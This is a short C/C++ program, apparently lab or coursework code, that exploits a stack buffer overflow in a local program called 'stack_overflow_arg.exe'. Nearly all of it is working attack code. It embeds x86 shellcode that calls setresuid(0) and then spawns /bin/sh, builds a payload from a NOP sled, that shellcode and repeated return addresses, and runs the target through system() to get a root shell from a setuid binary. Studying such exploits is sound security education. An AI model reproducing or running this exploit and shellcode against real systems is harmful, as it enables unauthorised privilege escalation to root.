#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>

using namespace std;
   
char shellcode[] = 
     // root shell; that escalates the priviledge for exploiting setuid program
     "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
     "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
     "\xe1\xcd\x80";
     
     // regular shell
     /*
     "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
     "\xc9\x89\xca\x6a\x0b\x58\xcd\x80";
     */

int main(int argc, char *argv[]) {
    // address of ref_var is used as the point of reference to determine offset
    size_t ref_var, ret_address, offset;
    size_t payload_len;
    char *ptr, *payload;

    string command = "./stack_overflow_arg.exe \"";
    
    if(argc == 2) // set offset
        offset = atoi(argv[1]);
    else
        offset = 228; // FIXME, if offset is determined

    // create payload
    // | NOP sled | shellcode | repeated return address |
    //char target_program[] = ; // ./program_name "arg"
    size_t ret_address_count = 5;
    payload_len = 144; // the actual offset of caller's return address withrespect to buffer
    payload = new char[payload_len];
    ptr = payload;

    size_t NOP_sled_len = payload_len - (sizeof(shellcode)-1) - (4*ret_address_count);
    memset(ptr, 0x90, NOP_sled_len); // build NOP sled
    ptr += NOP_sled_len;

    // copy shellcode
    memcpy(ptr, shellcode, sizeof(shellcode)-1);
    ptr += sizeof(shellcode)-1;

    ret_address = (unsigned int) &ref_var - offset; // set return address
    for(int i=0; i<(ret_address_count*4); i+=4) // fill ptr with return address
        *((unsigned int *)(ptr+i)) = ret_address;
    //printf("ref_var at %p\n", &ref_var);
    //printf("ret add = %p\n", ret_address);
    command += string(payload) + "\"";
    //cout << command.c_str();
    system(command.c_str()); // run exploit
    delete [] payload;
}

